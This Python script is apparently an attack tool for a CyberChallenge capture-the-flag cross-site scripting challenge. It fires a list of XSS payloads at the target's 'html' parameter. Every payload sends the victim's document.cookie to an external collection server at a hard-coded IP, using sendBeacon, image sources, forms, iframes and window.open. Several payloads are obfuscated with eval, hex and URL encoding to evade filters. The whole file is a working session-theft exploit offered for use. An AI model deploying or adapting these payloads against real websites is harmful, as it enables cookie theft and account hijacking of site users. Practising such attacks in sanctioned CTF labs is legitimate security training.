import requests
from urllib.parse import quote
import time

TARGET_URL = "http://xss5.challs.cyberchallenge.it/?html="
EXFIL_SERVER = "http://130.136.4.142:8080"
DELAY = 1  # seconds between requests

def test_payload(payload, name):
    """Test a payload and check for execution indicators"""
    encoded = quote(payload)
    full_url = TARGET_URL + encoded
    
    print(f"\n\033[1;36m[→] Testing: {name}\033[0m")
    print(f"Payload: {payload[:80]}{'...' if len(payload)>80 else ''}")
    
    try:
        start = time.time()
        r = requests.get(full_url, timeout=10)
        elapsed = time.time() - start
        
        # Check for indirect success indicators
        print(f"Status: {r.status_code} | Size: {len(r.text)} | Time: {elapsed:.2f}s")
        
        # Check for reflection
        clean_payload = payload.replace("'","").replace('"','').split('//')[0]
        if clean_payload in r.text:
            print("\033[33m[▲] Reflection detected\033[0m")
        else:
            print("[-] No direct reflection")
            
    except Exception as e:
        print(f"\033[31m[!] Error: {str(e)[:100]}\033[0m")

def cookie_exfil_payloads():
    """Generate payloads that exfiltrate cookies without semicolons"""
    return [
        # Basic fetch alternatives
        (f"')%0Anavigator.sendBeacon('{EXFIL_SERVER}',document.cookie)//", "sendBeacon"),
        (f"')%0Alocation.href='{EXFIL_SERVER}?c='+document.cookie//", "location.href"),
        
        # Image-based exfiltration
        (f"')%0Anew Image().src='{EXFIL_SERVER}?c='+document.cookie//", "Image.src"),
        (f"')%0Adocument.body.appendChild(Object.assign(document.createElement('img'),{{src:'{EXFIL_SERVER}?c='+document.cookie}}))//", "createElement img"),
        
        # Form submission
        (f"')%0Awith(document)body.appendChild(createElement('form')).submit()//", "Empty form submit"),
        (f"')%0A(f=document.createElement('form')).action='{EXFIL_SERVER}'%0A(f.i=document.createElement('input')).name='c'%0Af.appendChild(f.i)%0Af.i.value=document.cookie%0Adocument.body.appendChild(f).submit()//", "Dynamic form"),
        
        # Iframe techniques
        (f"')%0Adocument.write('<iframe src=\\'{EXFIL_SERVER}?c='+document.cookie+\\'></iframe>')//", "document.write iframe"),
        (f"')%0A(document.body.innerHTML+='<iframe src=\\'javascript:top.location=\\\\\\'{EXFIL_SERVER}?c='+document.cookie+'\\\\\\'></iframe>')//", "JavaScript iframe"),
        
        # Special element callbacks
        (f"')%0A(a=document.createElement('a')).href='{EXFIL_SERVER}?c='+document.cookie%0Aa.click()//", "Anchor click"),
        (f"')%0A(s=document.createElement('script')).src='{EXFIL_SERVER}?c='+document.cookie%0Adocument.body.appendChild(s)//", "Script tag src"),
        
        # Obfuscated approaches
        (f"')%0Aeval('navigator.sendBeacon(\\'{EXFIL_SERVER}\\',document.cookie)')//", "Obfuscated sendBeacon"),
        (f"')%0AFunction('navigator.sendBeacon(\\'{EXFIL_SERVER}\\',document.cookie)')()//", "Function constructor"),
        
        # Unicode and encoding tricks
        (f"')%0Aeval('\\x6e\\x61\\x76\\x69\\x67\\x61\\x74\\x6f\\x72\\x2e\\x73\\x65\\x6e\\x64\\x42\\x65\\x61\\x63\\x6f\\x6e\\x28\\x27{EXFIL_SERVER}\\x27\\x2c\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\\x2e\\x63\\x6f\\x6f\\x6b\\x69\\x65\\x29')//", "Hex encoded"),
        (f"')%0Aeval(unescape('navigator%2esendBeacon%28%27{EXFIL_SERVER}%27%2cdocument%2ecookie%29'))//", "URL encoded"),
        
        # DOM manipulation alternatives
        (f"')%0Adocument.body.innerHTML+=`<img src='{EXFIL_SERVER}?c=${{document.cookie}}'>`//", "Template literal img"),
        (f"')%0Aopen('{EXFIL_SERVER}?c='+document.cookie)//", "window.open"),
    ]

def main():
    print(f"\033[1;35m[♦] Starting XSS Cookie Exfiltration Testing\033[0m")
    print(f"\033[1;35m[♦] Monitoring server: {EXFIL_SERVER}\033[0m")
    
    for payload, name in cookie_exfil_payloads():
        test_payload(payload, name)
        time.sleep(DELAY)  # Rate limiting
    
    print("\n\033[1;32m[✓] Testing complete. Check your server logs for callbacks.\033[0m")
    print("\033[1;33m[!] Note: Successful execution may not show in response. Verify server-side.\033[0m")

if __name__ == "__main__":
    main()
